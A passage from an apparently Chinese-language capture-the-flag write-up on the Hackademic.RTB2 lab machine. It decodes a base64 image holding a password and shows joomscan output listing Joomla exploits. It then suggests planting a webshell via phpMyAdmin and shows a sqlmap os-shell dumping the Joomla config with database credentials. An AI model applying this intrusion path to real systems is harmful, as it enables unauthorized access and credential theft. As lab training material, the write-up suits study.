class="string">o8qNksPcc889JSUln/zkJ7///e9/8pOfPOWUUy677DK/hVIUZUpw8sknJ/7AkSNHEn/grbfeyvAW</span></span><br><span class="line"><span class="string">ykRo+wUltxkZGUl8PFIURVGmGmq5URRFURQlr1DlRlEURVGUvEKVG0VRFEVR8gpVbhRFURRFySum</span></span><br><span class="line"><span class="string">kHLT19eX+AOVlZXeSKJMWZLOMZ2EFknHobe3120ZkjYJ8UCGsWS+jmXD2CqK20wh5Wbbtm2JP6Ct</span></span><br><span class="line"><span class="string">5xW3STzHamtrZ82a5ZkwWUvScejr69u/f7+rMixdujSxcuOBDOOS4TqWDWOrKB4whZSbO+64I/EH</span></span><br><span class="line"><span class="string">br31Vm8kUaYsiefYF77wBc8kyWaSjsO//du/uS3DnXfe6bsM45LhOpYNY6soHjCFlJu//vWvDz30</span></span><br><span class="line"><span class="string">UIIPrF279tprr/VMHmUKkmCOnXvuuTfeeKPH8mQhScdh9+7dX/3qV12V4dprr924caO/MkxEJutY</span></span><br><span class="line"><span class="string">NoytonjDFFJugMsuu+yee+5J8IF777335ptv9kweZQoy7hy79NJLX3jhBV/kySqSjsOmTZtOP/10</span></span><br><span class="line"><span class="string">V2X42te+du+99/orQ2Imt45lw9gqimdMuQrFN9xww/e+972PfvSjCxYsWLRo0fr160d94K677rrh</span></span><br><span class="line"><span class="string">hht+/etf79u3r76+/tlnn/VFTiWPMedYeXn5xz/+8akc77V69eqlS5fOmDFjonHYsWPH/v37e3p6</span></span><br><span class="line"><span class="string">fvrTn27ZssUNGZYtW7Zq1aply5Zdc801tbW1Yz+wf//+HTt2uCpDWqS1jiWYYx6MraIoPjBnzpwn</span></span><br><span class="line"><span class="string">nngiNjGdnZ2XXHKJ32I6SYIva5E0SeTQoUOJr7Bq1Sq3Zcicm2++ObEMP/nJT9K9ZtLvlTkejG3m</span></span><br><span class="line"><span class="string">zzdFVq1a9dZbbyW40b59+0477TRH7jURVVVVW7duTSBDKBS64IILJnfxpM9i5cqVjnyLpOvY/9/e</span></span><br><span class="line"><span class="string">/cdUVf8PHL/7hMQcsTtTBAIlfolsyJShIt1MGZopc6ZzNd1qyx9h0820NStqc42mpjN/Ui1Ls2W5</span></span><br><span class="line"><span class="string">1GERaohC+QMNDCo0EBTIS0JBg8WdUHz/oC8acN/ncO6973PvOc/Hn9z3fZ/XeZ9z3vfFOe/zfuvS</span></span><br><span class="line"><span class="string">tl5OsYkkXCnFxcXiGjIzM8U1HDhwQFzD6tWrh9YuRmGux1ID3b59e9asWYJ7vFar9dixYxs2bJAZ</span></span><br><span class="line"><span class="string">FWB4mZmZZWVlMTExzgqUlJSMGzfu559/9lwMkZGRf/75p+C2WUtLy7Bhwzx3+3bmzJluqUexH+tH</span></span><br><span class="line"><span class="string">QtsC+jJ7ctNr1apV5eXlggI5OTnJycnS4gGMbeTIkXl5eYIC3d3djz76qKfDUFyTefz48R4NYPv2</span></span><br><span class="line"><span class="string">7W6sTbEf6yWnbQF9kdz8S3Ec8c6dO+VEAhjejh07xAVeeeUVT8ewbds2Pz/RoMMtW7a0tLR4Ooyq</span></span><br><span class="line"><span class="string">qio31qbmfQgJbQvojuTmX4WFheICqampzB4LuIXiAOozZ854OgbF0QyHDx/2dAwWiyU+Pr61tTUj</span></span><br><span class="line"><span class="string">I8MttSn2YxYpbQvojuTmrsbGRnGBhx9+WE4kgLFFRkaKC9TV1Xk6BsXJoJubmz0dQy+r1do7HLi6</span></span><br><span class="line"><span class="string">uvrkyZMuvsHQ3d0tLuBwOFypH/AJJDd3KT6ujoqKkhMJYGDx8fHi50FNTU0Sngd5oZiYmIyMjGPH</span></span><br><span class="line"><span class="string">jl2/fl1bDYpta6EfgzmQ3Ny1ZcsWcYF169bJiQQwsBdffFFcQHFEjuFFRUXZ7XYNX1RsWwv9GMyB</span></span><br><span class="line"><span class="string">5OaukpKSTz75RFDAZrO98MIL0uIBjMdmsy1fvlxQoLKy8q233pIWj9cKCQnZvHnzkL6i2LZ9xejH</span></span><br><span class="line"><span class="string">YHgkN/+xdOnS999/X1Bg165d/N8DaJOZmVlcXCwoUFRUNGHCBGnxeLmsrCz1hRXb9l70YzA80y2/</span></span><br><span class="line"><span class="string">oGjFihW7d+/OysoKDg6OjIwcOMXk22+/vWzZstzc3MbGxhs3bnz//fe6xAlfV1NTU11dHRIS4q4J</span></span><br><span class="line"><span class="string">f71TQkJCREREUFDQ6tWrbTbbwAK97fDXX3/t3btXzcs+5hEYGBgeHi540UFl2w56jtGPAaY2ZsyY</span></span><br><span class="line"><span class="string">M2fOCCa3bmhomD17tt5hDoF4ru4ell/4f55bfqGiouLeOSEVz7F7+dDyC0lJSRUVFerbQbLW1lbx</span></span><br><span class="line"><span class="string">biq+0qVI8VgocjY6eKhta7x+zHWKjc/yCz6Nx1IK6uvrH3vsMcEMfuHh4QUFBdnZ2TKjgu/qffJy</span></span><br><span class="line"><span class="string">7z/KiueYL1qwYMGVK1cEaycNbAf0U1RUNOh73Rraln4MZkNyo8qaNWsuXbokKLBx48bU1FRp8cBH</span></span><br><span class="line"><span class="string">dXR0OFtOSPEc8yHh4eFHjhwRFBC0A/oMOt2wK21LPwbzILlRS3H83bvvvisnEviuNWvWCD41zBjP</span></span><br><span class="line"><span class="string">Xbt2iQuI2wEWi2XZsmWD3tZysW3px2ASJDdqlZSUdHR0CAokJiaGh4dLiwe+qKSkRPyp+BzzFWlp</span></span><br><span class="line"><span class="string">aeIC4nYwufLy8smTJ3/wwQeDfupi29KPwSRIboZAcdbUUaNGyYkEPkrxFDLGzLyKKxsYYzfdqKio</span></span><br><span class="line"><span class="string">aN68eY888shDDz00adIkwcMj19uWfgxmwKvgAKCnp5566rPPPtM7CsBQSG4AQDdPPvnk0aNH9Y4C</span></span><br><span class="line"><span class="string">MBoeSwGAPgoLC8lsAE8guQEAfWzatEnvEABjMuljqbCwsIiICLvdXl9fr3csAEyqsrJS7xAAYzLd</span></span><br><span class="line"><span class="string">nZu4uLjS0tJff/31woULN2/eLC0tTUpK0jsoAGbkcDj0DgHa2e12cYGQkBBxgdDQUBdrUCxgWuZK</span></span><br><span class="line"><span class="string">bmbMmHHt2rWUlJS+v6SkpFy5cmXOnDk6RgUA8DmnT58WF5g/f77g08jIyJiYGHENir9NGRkZ4gKm</span></span><br><span class="line"><span class="string">ZaLkZuTIkc7Oxfz8fNcXyQMAmMdrr70mLrBy5crAwEBnn+7YsUNxEwsWLBAkQDk5OYo1mJaJkps9</span></span><br><span class="line"><span class="string">e/YIPtWwBDQAwMwmT54sLuBsadjVq1crrvjdy9mMjvPnz9+wYYOaGszJRMmNzWYTfDpjxgxpkQAA</span></span><br><span class="line"><span class="string">DODSpUtjx469ePGiswJxcXF2u33KlCl9fwkODj506JCa2za9rFZrT0/P7Nmz+/4yfPjw7du3Hzt2</span></span><br><span class="line"><span class="string">THPYZmCit6XEA6/8/PysVmtbW5u0eADoKCAgQFyA0b5Qo76+furUqWFhYbGxsUFBQVlZWf0GyoSE</span></span><br><span class="line"><span class="string">hFy4cKGpqamqqspqtU6cOFHDVgoKCjo6OsrLywMCAu4dNgpnTJTcAECv8PBwcXLT0dHR1NQkLR74</span></span><br><span class="line"><span class="string">ulu3bt26dctisRw/fjw1NfXcuXP9CoSEhLj4ZlNgYKD4+QPuZaLHUgDQa8WKFeICH374oZxIYDzn</span></span><br><span class="line"><span class="string">z58fO3as3lGYHckNAHMZM2ZMdna2oMAff/yxZs0aafHAeOrr69evX693FKZGcgPARBITE2/evCko</span></span><br><span class="line"><span class="string">UFtb++CDD0qLB0b1zjvv6B2CqZHcADC4oKCghISEuXPn5ufnV1RUDCzgcDgqKyuPHz8+b9686Oho</span></span><br><span class="line"><span class="string">+RHCeLq7u69evap3FObFgGIAhhUWFvb555+npaU5K9DW1rZo0aLCwkKZUcEk6urq4uPj9Y3BtOPi</span></span><br><span class="line"><span class="string">SW4AGFNKSkppaamgQE1NTWxsrLR4YDZff/217mv7nDp1St8A9MJjKQAGFBgYKM5sLBYLmQ08aufO</span></span><br><span class="line"><span class="string">nfrOlrR3717TTt5GcgPAgHJzc8UFeJkFEkybNk2vTV+6dGnVqlV6bV13JDcADCg9PV1c4KuvvpIT</span></span><br><span class="line"><span class="string">CcysvLw8Ojr6/Pnzkre7adMmxXWvjI0xNwAMSHE2WNMOtEQvh8MhnqVacYEOlWpra6dNmxYVFTV+</span></span><br><span class="line"><span class="string">/Hh31SnQ1tbGAHkLyQ0AwISqq6sTExMFBWJjY92YAdfW1tbW1rqrNijisRQAwHT2798vLrBy5Uo5</span></span><br><span class="line"><span class="string">kcATSG4AAKazdetW8a2UJUuWaFvBG96A5AYAYEbR0dG//PKLoEBZWVlycrK0eOBGJDcAAJMaN27c</span></span><br><span class="line"><span class="string">okWLioqKampquru7Bxa4fPnyl19+OXv27KioqP/9j19Mn8GhAgCY1xdffDFz5szY2Nhhw4Y9/vjj</span></span><br><span class="line"><span class="string">LS0t/QrMnTu3oKDg+vXrf//995kzZ8aMGaNLnBgSkhsAACwWi+XEiROjRo2qrKx0VmD69Ok3b960</span></span><br><span class="line"><span class="string">2Wwyo4IGJDcAANw1YcIE8aoFxcXFkZGRssKBFiQ3AAD8x7PPPisu8NFHH8mIA1qR3AAA8B8nTpwQ</span></span><br><span class="line"><span class="string">F5g+fbqfH7Pgei8TJTeDjoS/l+KZqlhAcRPegHYwNgnH13Xe8KvgDTFowPUrh8PhUJyemCdT3sxE</span></span><br><span class="line"><span class="string">yU1NTY24QGxsrOBTPz+/8PBwcQ3V1dVDDks62sHYJBxf14ljkMMbYtCA61eaixcviguEhobKiQQa</span></span><br><span class="line"><span class="string">mCi5OXTokLjAM888I/h0wYIF4q+fOnXK4XAMOSzpaAdj8/TxdQtxDHJ4QwwacP1K8/zzz4sLzJkz</span></span><br><span class="line"><span class="string">R04kgILffvutR0hwm1H8xZ6eHqvVKnFXXKJ7O3hDY7700kviGN57772h1un6ftXV1YlrUDMfvEeP</span></span><br><span class="line"><span class="string">r5oY1FTi6Vv6PhGDtvNc9+vXPLKyssTNpXeAcMpEd24sFsvo0aPFj1Hr6uoG9gv+/v6///67uObo</span></span><br><span class="line"><span class="string">6Gjxq4NehXYwNs8dXzcaNAbJvCEGDbh+pdm7d+/rr78uKPDTTz+NGDFCWjyAyNq1a8vKypqbm50l</span></span><br><span class="line"><span class="string">47m5uVOmTBkxYkRCQkJ2drazYp2dnVVVVZs3b9Z7hzTSsR3E/wz1cOfGOfUr+bnr+GqIQX1VfTEE</span></span><br><span class="line"><span class="string">KVG5174Vgyvnuff0Y8OHD9f8XZ+QlpZ2+vRpu93urA1fffXV9PT04OBgxVPIdXo3BnyBv7//kiVL</span></span><br><span class="line"><span class="string">urq6FPugfl5++eXg4GC9w3cb+e2gWDPJjTMalinWfHw1x+CuDd2rq6srPz9f/fnmEzG45TzXsR/b</span></span><br><span class="line"><span class="string">t29fe3t7T09PZ2fngQMHDL/0kr+///z581tbW7WcPe5z8uTJpKQkvRsDvkCQkg9kpLSmH2ntoFg5</span></span><br><span class="line"><span class="string">yY0zGpKbPkM6vq7E4JatOKNy5nufiMG957nMfsxqtQ5abUhIiLt2x5tVVFSob2oPWblypd7N4NUM</span></span><br><span class="line"><span class="string">nmirFBoaqnJqh7Fjx96+fdvT8eiFdjA29cfXmxUXF8fExBDDQDKv3+bm5kH/brfbfXQCoSGZMGHC</span></span><br><span class="line"><span class="string">wPU1JcvNzU1PT9c3Bm9GcvMvxcm2LRbLp59+Wl9f7/lY9EQ7GJua4+v9Dhw4oHcIXhHDQHKu323b</span></span><br><span class="line"><span class="string">tgkymH379rlSua9YunSp3iFYDh48qHcI8HoBAQGKtwHNsBKsnHZQ3ASPpZxx5bGURd3xVaTvY6le</span></span><br><span class="line"><span class="string">I0eONEAMbj/P5Vy/DQ0Ngvo7Ozvdsi/ez43j2DSbMWOG3s3gpbhz8y+Hw6H4DmRDQ4OcYHTkcDgU</span></span><br><span class="line"><span class="string">b7fW1dW5uBXFm+cSnp54IgbX6/R0y6g5vq6TcPgUJ4f1iRjcHqSc61c8sCYgICAwMNDFTfiEGzdu</span></span><br><span class="line"><span class="string">6B2CwrEwM5Ib9KeYwzU2Nrq4CXENHR0dHR0dLm7CxRgsKiZfH0jc2anZL8XGd/2XSUKO7voZokjC</span></span><br><span class="line"><span class="string">WerpGDx0npvk+vUG3vDvroTz3EeR3KC/jz/+WPDp8ePHXd/E4cOHNX/qLopbKSwsHGqd4kfgavZr</span></span><br><span class="line"><span class="string">9+7dgk9PnTrl+s+G+Pi6haeP4Hfffad4n9X7Y/BQhCa5fr2B+GqVoLGxsaSkRN8Y4AMUZy/wxclM</span></span><br><span class="line"><span class="string">tRG8U+quG86902MMyi31q7F8+XJnMeTk5GirUzA1vsoarl275qwGdw3RcPGdcDXjfgTH13Uql/b0</span></span><br><span class="line"><span class="string">8hjUfF0bk1y/3kBwtUqQlpamdwPAF5Dc3GvQH+moqCh31R8QEDCwf+zq6pK8tM3GjRsH7uaePXtc</span></span><br><span class="line"><span class="string">qXPgT8tQ9+v69esebXyLivWJBNQkN4MeX7dISUlRuY9eG4OE89wk1683GPRqlcBHV36FDkhu+nnj</span></span><br><span class="line"><span class="string">jTeqqqq6uroaGhree+89T0w/unnz5rq6ut5NbNu2ze31qzFx4sQjR440Nze3t7efPHkyNTXV9Trf</span></span><br><span class="line"><span class="string">fPNNF/dr3bp1FRUVnZ2ddrvdQ+/W9h3fofaq6t/Y6ju+Wjvwu+x2+8GDBzXM9O9VMcg8z01y/XqD</span></span><br><span class="line"><span class="string">vqvV9XNMUXNzc0FBgXv/1YHBkdzAnIKDgwVP6AZy8XV0AIA8JDcwOfH8JSQ3AHwFb0sB+FdERIQB</span></span><br><span class="line"><span class="string">1mcAAJIbAHctXrxY7xAAwFUkNwDuOnr0qN4hAICrjL98q5dISEiw2Wze8J5kd3f3jz/+eOLECb0D</span></span><br><span class="line"><span class="string">gZe6ceMGw8vgIfSEgGxlZWXicZSaa/7222/VvogiS11dXUJCghtbD4bh6cU7YVr0hIAO1q5dK7gG</span></span><br><span class="line"><span class="string">8vLytFUr7SrVYPr06e5tQxgAyQ08QUqXphE9IQzO7dOWl5aWyrxENXB7G8LXkdzA7egJIRkDiv8j</span></span><br><span class="line"><span class="string">NDT09u3bA/8eHR2tYcHC1NRU9dO062Xt2rV6hwDAyOgJIR/JTX+jR4/eunVrU1OTxWLp6Og4fPjw</span></span><br><span class="line"><span class="string">fffdV1tbq6Eqn5ghOyMjQ+8QABgZPSHkI7kZxPr160NDQ++///4HHnhg8eLF//zzj7Z6/P393RsY</span></span><br><span class="line"><span class="string">oF5GRsa5c+daW1urq6s3bNigdzgwL3pCyEdy49SdO3dcrOHq1atuicSjzp49q3cIcL+8vLzeRUCt</span></span><br><span class="line"><span class="string">VmtMTExOTk5rayu/MdAFPSFgNJcvX9Z7nJwCPz/mOjKa4uLiQY91V1eXmq8zoBhuR08Iybhz41lT</span></span><br><span class="line"><span class="string">p07VOwSRWbNmsZaQwTz33HM2m23Qj/z8/Pbs2SM5HsBCTwgYj7+/v+L0gPK1t7enpaXp3TZwv6qq</span></span><br><span class="line"><span class="string">KvFxV6yBOzfwBHpCyMSNOI+7c+fOpEmT0tPTlyxZ4nA49A7H4nA4fvjhh/379+sdCDwiPj5e8Glg</span></span><br><span class="line"><span class="string">YKDVam1ra5MWD9CLnhAAoJHiv6qKy/pw5waAr2PMDQAAMBSSGwAAYCgkNwAAwFBIbgAAgKGQ3AAA</span></span><br><span class="line"><span class="string">AEMhuQEAAIZCcgMAAAyF5AYAABgKyQ0AADAUkhsAAGAoJDeAoTQdSUSlAAABo0lEQVQ2NooLRERE</span></span><br><span class="line"><span class="string">iAuEh4eLCzQ0NAwtJgCQi+QGMJTCwkJxgSeeeELwqc1m8/MTradbUlLS0tKiJTIAAAAN/Pz8FNfO</span></span><br><span class="line"><span class="string">DAgIcPZ1Vs0EAABeJzExUZygOHuulJ+fL/7i008/LXlfAAAALBaLJSgo6PTp04I0paura/bs2X3l</span></span><br><span class="line"><span class="string">U1JSqqurBeWLi4sTEhJ03CMAAADL8OHD4+Li0tPT8/LynKU4VVVVra2tg36al5e3cOHC5OTkESNG</span></span><br><span class="line"><span class="string">6L0rAAAA/xUTEyN+5NTP3Llz9Q4ZAABAKDg4WGVmk5GRoXewAAAAKmRnZytmNt98843eYQIAAKgT</span></span><br><span class="line"><span class="string">EhKimNxkZmbqHSYAAIBq7e3t4uQmJiZG7xgBAABUq6ioECc34hmKAcD7sfwCYC7iITVnz57t7u6W</span></span><br><span class="line"><span class="string">FgwAAIAbCG7bxMfH6x0dAADAEMXFxQ2a2SxcuFDv0AAAADQJCgoqLi7uS2tKS0uTkpL0DgoAAMA1</span></span><br><span class="line"><span class="string">QUFBycnJYWFhegcCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span><br><span class="line"><span class="string">AAAAAACg0f8BeD+YFbp5dlYAAAAASUVORK5CYII=&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">imgdata=base64.b64decode(strs)</span><br><span class="line">file=open(<span class="string">&#x27;key.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">file.write(imgdata)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>

<p>python3运行即可得到图片，原图如下：</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/key.png"></p>
<p>还可以使用在线工具直接将base64字符串转成图片：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jb2RlYmVhdXRpZnkub3JnL2Jhc2U2NC10by1pbWFnZS1jb252ZXJ0ZXI=">Convert Your Base64 to Image<i class="fa fa-external-link-alt"></i></span></p>
<p>登陆密码即在图片中，挑战完成，帅！！！</p>
<h3 id="其它方法"><a href="#其它方法" class="headerlink" title="其它方法"></a>其它方法</h3><ul>
<li>使用joomscan扫描可以发现存在非常多的漏洞，远程代码执行，sql注入等等，下载对应的poc或者脚本运行即可</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># joomscan -u http://192.168.84.143:666/</span></span><br><span class="line">    ____  _____  _____  __  __  ___   ___    __    _  _ </span><br><span class="line">   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )</span><br><span class="line">  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( </span><br><span class="line">  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)</span><br><span class="line">                        (1337.today)</span><br><span class="line">   </span><br><span class="line">    --=[OWASP JoomScan</span><br><span class="line">    +---++---==[Version : 0.0.7</span><br><span class="line">    +---++---==[Update Date : [2018/09/23]</span><br><span class="line">    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo</span><br><span class="line">    --=[Code name : Self Challenge</span><br><span class="line">    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP</span><br><span class="line"></span><br><span class="line">Processing http://192.168.84.143:666/ ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] FireWall Detector</span><br><span class="line">[++] Firewall not detected</span><br><span class="line"></span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla 1.5</span><br><span class="line"></span><br><span class="line">[+] Core Joomla Vulnerability</span><br><span class="line">[++] Joomla! 1.5 Beta 2 - <span class="string">&#x27;Search&#x27;</span> Remote Code Execution</span><br><span class="line">EDB : https://www.exploit-db.com/exploits/4212/</span><br><span class="line"></span><br><span class="line">Joomla! 1.5 Beta1/Beta2/RC1 - SQL Injection</span><br><span class="line">CVE : CVE-2007-4781</span><br><span class="line">EDB : https://www.exploit-db.com/exploits/4350/</span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5.x - (Token) Remote Admin Change Password                                                   </span><br><span class="line">CVE : CVE-2008-3681                                                                                    </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/6234/                                                        </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5.x - Cross-Site Scripting / Information Disclosure                                          </span><br><span class="line">CVE: CVE-2011-4909                                                                                     </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/33061/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5.x - 404 Error Page Cross-Site Scripting                                                    </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/33378/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5.12 - <span class="built_in">read</span>/<span class="built_in">exec</span> Remote files                                                                </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/11263/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5.12 - connect back Exploit                                                                  </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/11262/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! Plugin <span class="string">&#x27;tinybrowser&#x27;</span> 1.5.12 - Arbitrary File Upload / Code Execution (Metasploit)              </span><br><span class="line">CVE : CVE-2011-4908                                                                                    </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/9926/                                                        </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5 - URL Redirecting                                                                          </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/14722/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5.x - SQL Error Information Disclosure                                                       </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/34955/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! - Spam Mail Relay                                                                              </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/15979/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5/1.6 - JFilterInput Cross-Site Scripting Bypass                                             </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/16091/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! &lt; 1.7.0 - Multiple Cross-Site Scripting Vulnerabilities                                        </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/36176/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5 &lt; 3.4.5 - Object Injection Remote Command Execution                                        </span><br><span class="line">CVE : CVE-2015-8562                                                                                    </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/38977/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.0 &lt; 3.4.5 - Object Injection <span class="string">&#x27;x-forwarded-for&#x27;</span> Header Remote Code Execution                  </span><br><span class="line">CVE : CVE-2015-8562 , CVE-2015-8566                                                                    </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/39033/                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! 1.5.0 Beta - <span class="string">&#x27;pcltar.php&#x27;</span> Remote File Inclusion                                                </span><br><span class="line">CVE : CVE-2007-2199                                                                                    </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/3781/                                                        </span><br><span class="line">                                                                                                       </span><br><span class="line">Joomla! Component xstandard editor 1.5.8 - Local Directory Traversal                                   </span><br><span class="line">CVE : CVE-2009-0113                                                                                    </span><br><span class="line">EDB : https://www.exploit-db.com/exploits/7691/                                                        </span><br><span class="line">                                                                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">[+] Checking Directory Listing                                                                         </span><br><span class="line">[++] directory has directory listing :                                                                 </span><br><span class="line">http://192.168.84.143:666/tmp                                                                          </span><br><span class="line">                                                                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">[+] Checking apache info/status files                                                                  </span><br><span class="line">[++] Readable info/status files are not found                                                          </span><br><span class="line">                                                                                                       </span><br><span class="line">[+] admin finder                                                                                       </span><br><span class="line">[++] Admin page : http://192.168.84.143:666/administrator/                                             </span><br><span class="line">                                                                                                       </span><br><span class="line">[+] Checking robots.txt existing                                                                       </span><br><span class="line">[++] robots.txt is found                                                                               </span><br><span class="line">path : http://192.168.84.143:666/robots.txt                                                            </span><br><span class="line">                                                                                                       </span><br><span class="line">Interesting path found from robots.txt                                                                 </span><br><span class="line">http://192.168.84.143:666/administrator/                                                               </span><br><span class="line">http://192.168.84.143:666/cache/                                                                       </span><br><span class="line">http://192.168.84.143:666/components/                                                                  </span><br><span class="line">http://192.168.84.143:666/images/                                                                      </span><br><span class="line">http://192.168.84.143:666/includes/                                                                    </span><br><span class="line">http://192.168.84.143:666/installation/                                                                </span><br><span class="line">http://192.168.84.143:666/language/                                                                    </span><br><span class="line">http://192.168.84.143:666/libraries/                                                                   </span><br><span class="line">http://192.168.84.143:666/media/                                                                       </span><br><span class="line">http://192.168.84.143:666/modules/                                                                     </span><br><span class="line">http://192.168.84.143:666/plugins/                                                                     </span><br><span class="line">http://192.168.84.143:666/templates/                                                                   </span><br><span class="line">http://192.168.84.143:666/tmp/                                                                         </span><br><span class="line">http://192.168.84.143:666/xmlrpc/                                                                      </span><br><span class="line">                                                                                                       </span><br><span class="line">                                                                                                       </span><br><span class="line">[+] Finding common backup files name                                                                   </span><br><span class="line">[++] Backup files are not found                                                                        </span><br><span class="line">                                                                                                       </span><br><span class="line">[+] Finding common <span class="built_in">log</span> files name                                                                      </span><br><span class="line">[++] error <span class="built_in">log</span> is not found                                                                            </span><br><span class="line">                                                                                                       </span><br><span class="line">[+] Checking sensitive config.php.x file                                                               </span><br><span class="line">[++] Readable config file is found                                                                     </span><br><span class="line"> config file path : http://192.168.84.143:666/configuration.php-dist </span><br></pre></td></tr></table></figure>

<ul>
<li>使用sqlmap查看配置文件中的phpmyadmin的用户名和密码，然后利用phpmyadmin写木马</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">os-shell&gt; cat configuration.php</span><br><span class="line"><span class="keyword">do</span> you want to retrieve the <span class="built_in">command</span> standard output? [Y/n/a] <span class="built_in">command</span> standard output:</span><br><span class="line">---</span><br><span class="line">&lt;?php</span><br><span class="line">class JConfig &#123;</span><br><span class="line">/* Site Settings */</span><br><span class="line">var <span class="variable">$offline</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$offline_message</span> = <span class="string">&#x27;This site is down for maintenance.&lt;br /&gt; Please check back again soon.&#x27;</span>;</span><br><span class="line">var <span class="variable">$sitename</span> = <span class="string">&#x27;Hackademic.RTB2&#x27;</span>;</span><br><span class="line">var <span class="variable">$editor</span> = <span class="string">&#x27;tinymce&#x27;</span>;</span><br><span class="line">var <span class="variable">$list_limit</span> = <span class="string">&#x27;20&#x27;</span>;</span><br><span class="line">var <span class="variable">$legacy</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">/* Debug Settings */</span><br><span class="line">var <span class="variable">$debug</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$debug_lang</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">/* Database Settings */</span><br><span class="line">var <span class="variable">$dbtype</span> = <span class="string">&#x27;mysql&#x27;</span>;</span><br><span class="line">var <span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">var <span class="variable">$user</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">var <span class="variable">$password</span> = <span class="string">&#x27;yUtJklM97W&#x27;</span>;</span><br><span class="line">var <span class="variable">$db</span> = <span class="string">&#x27;joomla&#x27;</span>;</span><br><span class="line">var <span class="variable">$dbprefix</span> = <span class="string">&#x27;jos_&#x27;</span>;</span><br><span class="line">/* Server Settings */</span><br><span class="line">var <span class="variable">$live_site</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">var <span class="variable">$secret</span> = <span class="string">&#x27;iFzlVUCg9BBPoUDU&#x27;</span>;</span><br><span class="line">var <span class="variable">$gzip</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$error_reporting</span> = <span class="string">&#x27;-1&#x27;</span>;</span><br><span class="line">var <span class="variable">$helpurl</span> = <span class="string">&#x27;http://help.joomla.org&#x27;</span>;</span><br><span class="line">var <span class="variable">$xmlrpc_server</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$ftp_host</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">var <span class="variable">$ftp_port</span> = <span class="string">&#x27;21&#x27;</span>;</span><br><span class="line">var <span class="variable">$ftp_user</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">var <span class="variable">$ftp_pass</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">var <span class="variable">$ftp_root</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">var <span class="variable">$ftp_enable</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$force_ssl</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">/* Locale Settings */</span><br><span class="line">var <span class="variable">$offset</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$offset_user</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">/* Mail Settings */</span><br><span class="line">var <span class="variable">$mailer</span> = <span class="string">&#x27;mail&#x27;</span>;</span><br><span class="line">var <span class="variable">$mailfrom</span> = <span class="string">&#x27;admin@hackademirtb2.com&#x27;</span>;</span><br><span class="line">var <span class="variable">$fromname</span> = <span class="string">&#x27;Hackademic.RTB2&#x27;</span>;</span><br><span class="line">var <span class="variable">$sendmail</span> = <span class="string">&#x27;/usr/sbin/sendmail&#x27;</span>;</span><br><span class="line">var <span class="variable">$smtpauth</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span 